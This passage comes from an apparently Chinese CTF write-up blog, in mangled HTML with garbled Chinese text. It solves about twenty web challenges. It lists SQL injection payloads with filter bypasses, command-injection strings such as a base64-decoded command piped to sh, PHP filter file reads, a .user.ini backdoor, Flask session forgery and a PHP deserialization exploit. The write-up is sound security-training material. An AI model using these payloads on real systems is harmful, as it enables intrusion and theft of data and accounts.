class=&#34;hljs-comment&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;; alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; words1;alter table `&lt;span class=&#34;hljs-number&#34;&gt;1919810931114514&lt;/span&gt;` rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt;;alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; add &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; int;a;ter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; alter &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; default &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åç”¨ &lt;code&gt;1&#39;or 1=1 #&lt;/code&gt; æ‹¿åˆ° flag&lt;/p&gt;
&lt;p&gt;å¦ payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight smali&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smali&#34;&gt;1&amp;#x27;;&lt;br&gt;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;&lt;br&gt;prepare execsql from @a;&lt;span class=&#34;hljs-built_in&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;execute &lt;/span&gt;execsql;&lt;span class=&#34;hljs-comment&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;æŠ¤ç½‘æ¯-2018easy_tornado&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æŠ¤ç½‘æ¯-2018easy_tornado&#34;&gt;#&lt;/a&gt; [æŠ¤ç½‘æ¯ 2018] easy_tornado&lt;/h2&gt;
&lt;p&gt;SSTIï¼Œhandler.settings æ‹¿ secret-cookie&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019easysql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019easysql&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] EasySQL&lt;/h2&gt;
&lt;p&gt;ä¸‡èƒ½å¯†ç ç›´æ¥æ‹¿ flag&lt;/p&gt;
&lt;h2 id=&#34;roarctf-2019easy-calc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf-2019easy-calc&#34;&gt;#&lt;/a&gt; [RoarCTF 2019]Easy Calc&lt;/h2&gt;
&lt;p&gt;æŸ¥çœ‹æºä»£ç å‘ç° /calc.php?num=ï¼Œè®¿é—® calc.php æ‹¿åˆ°æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;num&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    show_source(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;num&amp;#x27;&lt;/span&gt;];&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$blacklist&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\[&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\]&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\^&amp;#x27;&lt;/span&gt;];&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$blacklist&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$blackitem&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$blackitem&lt;/span&gt; . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/m&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;)) &amp;#123;&lt;br&gt;                        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;what are you want to do?&amp;quot;&lt;/span&gt;);&lt;br&gt;                &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;echo &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;php çš„è§£æè§„åˆ™ï¼Œå½“ php è¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ç”¨ &lt;code&gt;? num=&lt;/code&gt;  å°±å¯ä»¥ç»•è¿‡ waf çš„æ£€æµ‹ï¼Œä½†æ˜¯è¿™æ ·åªèƒ½ç»•è¿‡ waf ä½†æ˜¯å¹¶ä¸èƒ½ç»•è¿‡é»‘åå•æ£€æµ‹ã€‚ç”¨ chr (47) ç»•è¿‡ &lt;code&gt;\&lt;/code&gt;  æ£€æµ‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;hctf-2018admin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf-2018admin&#34;&gt;#&lt;/a&gt; [HCTF 2018]admin&lt;/h2&gt;
&lt;p&gt;å‡ºé¢˜äºº WPï¼šâ€œ&lt;a href=&#34;https://www.ckj123.com/?p=147&#34;&gt;https://www.ckj123.com/?p=147&lt;/a&gt;â€&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹å¯†ç é¡µé¢æ³¨é‡Šæœ‰ git æºç æ³„éœ²ï¼Œ&lt;a href=&#34;https://github.com/woadsl1234/hctf_flask/%EF%BC%8C&#34;&gt;https://github.com/woadsl1234/hctf_flask/ï¼Œ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ®è¯´æœ¬é¢˜æœ‰å¤šç§è§£æ³•ï¼Œä¸€æ˜¯ flask çš„ session æœºåˆ¶ï¼Œsession æ³„éœ²åè§£å¯†å‡ºæ¥ï¼Œä¿®æ”¹ name çš„å€¼ä¸º admin å†ç”¨æºç ä¸­çš„ secret-key åŠ å¯†ï¼Œå°±å¯ä»¥å®ç°ä½ç½® adminã€‚äºŒæ˜¯ç”¨åˆ° Unicode åŒå½¢å­—å¼•èµ·çš„å®‰å…¨é—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;spotify ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´](&lt;a href=&#34;https://labs.spotify.com/2013/06/18/creative-usernames/&#34;&gt;https://labs.spotify.com/2013/06/18/creative-usernames/&lt;/a&gt;)&lt;br&gt;
 æ¼æ´ç®€ä»‹:&lt;br&gt;
 æ‰¾ä¸€ä¸ªéœ€è¦é»‘æ‰çš„è´¦å·ï¼Œæ¯”å¦‚ä»¥ bigbird ä¸ºä¾‹ã€‚åˆ›å»ºä¸€ä¸ªè´¦æˆ·åä¸º á´®á´µá´³á´®á´µá´¿á´° (in python this is the string uâ€™\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30â€²)ã€‚ç„¶åç”³è¯·ä¿®æ”¹å¿˜è®°å¯†ç ï¼Œä¿®æ”¹è‡ªå·±ç”³è¯·çš„è´¦å·å¯†ç ã€‚ä¿®æ”¹ä¹‹åä»¥åˆšåˆšè®¾ç½®çš„å¯†ç ç™»å½• bigbirdã€‚å°±å¯ä»¥æˆåŠŸç™»å½•ã€‚ä¸‰æ˜¯æ¡ä»¶ç«äº‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019secret-file&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019secret-file&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] Secret File&lt;/h2&gt;
&lt;p&gt;base64_decode(/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php)&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019lovesql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019lovesql&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] LoveSQL&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&#39;/**/union/**/select/**/1,database(),database()/**/%23&lt;/code&gt;  æ‹¿åˆ°æ•°æ®åº“å =&amp;gt;â€˜geekâ€™&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/%23&lt;/code&gt;  æ‹¿åˆ°è¡¨å =&amp;gt;â€˜geekuserâ€™,â€˜l0ve1ysq1â€™&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/password/**/from/**/l0ve1ysq1/**/limit/**/15,1)/**/%23&lt;/code&gt;  æ‹¿åˆ° flag=&amp;gt;â€˜flag {6d319459-bf52-4be1-8371-83d8d2b8a8d2}â€™&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019php&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] PHP&lt;/h2&gt;
&lt;p&gt;/www.zip æºç &lt;/p&gt;
&lt;p&gt;çœ‹æºç æ˜¯ PHP ååºåˆ—åŒ–&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Name;&lt;br&gt;var_dump(urlencode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;)));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019knife&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019knife&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] Knife&lt;/h2&gt;
&lt;p&gt;ç™½ç»™ä¸€å¥è¯&lt;/p&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019http&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019http&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] Http&lt;/h2&gt;
&lt;p&gt;/Secret.php&lt;/p&gt;
&lt;p&gt;æ”¹ Refererã€UAã€X-Forwarded-For&lt;/p&gt;
&lt;h2 id=&#34;suctf-2019checkin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf-2019checkin&#34;&gt;#&lt;/a&gt; [SUCTF 2019]CheckIn&lt;/h2&gt;
&lt;p&gt;.user.ini(&lt;a href=&#34;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&#34;&gt;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;ä¸»è¦åˆ©ç”¨å°±æ˜¯åœ¨.user.ini æ–‡ä»¶ä¸­å†™å…¥ï¼š &lt;code&gt;auto_prepend_file=01.gif&lt;/code&gt; , å°±ä¼šåœ¨ç›®å½•ä¸‹çš„ php æ–‡ä»¶ä¸­è‡ªåŠ¨åŒ…å« 01.gif&lt;/p&gt;
&lt;h2 id=&#34;gxyctf2019ping-ping-ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019ping-ping-ping&#34;&gt;#&lt;/a&gt; [GXYCTF2019]Ping Ping Ping&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;åˆ©ç”¨ï¼›æˆ–è€… | å¯ä»¥æ‰§è¡Œå‘½ä»¤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å‘ç°ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ $IFS ç»•è¿‡ï¼Œå¦å¤–è¿˜æœ‰&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;&amp;lt; ã€&amp;lt;&amp;gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&amp;#123;IFS&amp;#125;ã€$IFSã€&amp;#123;cat,flag.php&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸èƒ½å‡ºç° flagï¼Œé€šé…ç¬¦ä¹Ÿä¸èƒ½ç”¨ï¼Œåªå¥½ç›´æ¥å…¨éƒ½è¯»å‡ºæ¥&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;/?ip=127.0.0.1|&lt;span class=&#34;hljs-keyword&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$IFS&lt;/span&gt;`&lt;span class=&#34;hljs-keyword&#34;&gt;ls&lt;/span&gt;`&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æˆ–è€… &lt;code&gt;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¦å¤–é»‘åå•ç»•è¿‡è¿˜æœ‰ä»¥ä¸‹è¿™äº›æ–¹æ³•&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;actf2020-æ–°ç”Ÿèµ›include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-æ–°ç”Ÿèµ›include&#34;&gt;#&lt;/a&gt; [ACTF2020 æ–°ç”Ÿèµ›] Include&lt;/h2&gt;
&lt;p&gt;base64_decode(/?file=php://filter/convert.base64-encode/resource=flag.php)&lt;/p&gt;
&lt;h2 id=&#34;actf2020-æ–°ç”Ÿèµ›backupfile&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-æ–°ç”Ÿèµ›backupfile&#34;&gt;#&lt;/a&gt; [ACTF2020 æ–°ç”Ÿèµ›] BackupFile&lt;/h2&gt;
&lt;p&gt;å¸¸è§å¤‡ä»½æ–‡ä»¶ *.swp   *.bak&lt;/p&gt;
&lt;p&gt;è®¿é—® index.php.bak æ‹¿åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; = intval(&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; == &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;index.php?key=123 æ‹¿åˆ° flag&lt;/p&gt;
&lt;h2 id=&#34;ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world&#34;&gt;#&lt;/a&gt; [CISCN2019 ååŒ—èµ›åŒº Day2 Web1] Hack World&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;é¢˜ç›®æç¤ºæ˜¯ SQLï¼Œå•å¼•å·é—­åˆæ²¡æœ‰ç”¨ï¼ŒåŒå¼•å·åˆè¢«è¿‡æ»¤äº†ï¼ŒçŒœæµ‹æ˜¯æ•°å­—å‹æ³¨å…¥&lt;/li&gt;
&lt;li&gt;æµ‹è¯•å‘ç° 0ï¼Œ1ï¼Œ2 è¿”å›ç»“æœä¸åŒï¼Œåº”è¯¥å­˜åœ¨ bool æ³¨å…¥&lt;/li&gt;
&lt;li&gt;fuzz ä¸€ä¸‹æµ‹è¯•è¿‡æ»¤äº†å“ªäº›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0^(ascii(substr((select(flag)from(flag)),1,1))&amp;gt;1)&lt;/code&gt; + &lt;code&gt;0^(ascii(substr((select(flag)from(flag)),1,1))&amp;gt;1000)&lt;/code&gt;  ç»“æœä¸åŒï¼Œç›²æ³¨æ‹¿ flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019babysql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019babysql&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] BabySQL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;|| 1=1 #&lt;/code&gt; æ‹¿åˆ° admin å¯†ç ï¼šâ€667252cbf386409fcf10e06a81c1c19aâ€œã€‚ç™»é™†ä¹‹åå‘ç°æ²¡å•¥ç”¨&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,3%23&lt;/code&gt;  æµ‹è¯•å¯ä»¥æ³¨å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,(seselectlect%20table_name%20frfromom%20infoorrmation_schema.tables%20whewherere%20table_schema=database()%20limit%200,1)%23&lt;/code&gt;  æ‹¿åˆ°è¡¨å =&amp;gt;â€b4bsqlã€geekuserâ€œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20column_name%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=&#39;b4bsql&#39;%20limit%200,1)%23 &lt;/code&gt; æ‹¿åˆ°å­—æ®µå =&amp;gt;â€œidã€usernameã€passwordâ€&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20passwoorrd%20frfromom%20b4bsql%20limit%207,1)%23&lt;/code&gt;  æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æå®¢å¤§æŒ‘æˆ˜-2019hardsql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æå®¢å¤§æŒ‘æˆ˜-2019hardsql&#34;&gt;#&lt;/a&gt; [æå®¢å¤§æŒ‘æˆ˜ 2019] HardSQL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æŠ¥é”™æ³¨å…¥ï¼Œpayload&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;username&lt;/span&gt;=admin&amp;amp;password=admin%&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;^extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;e,(select(right((password),&lt;span 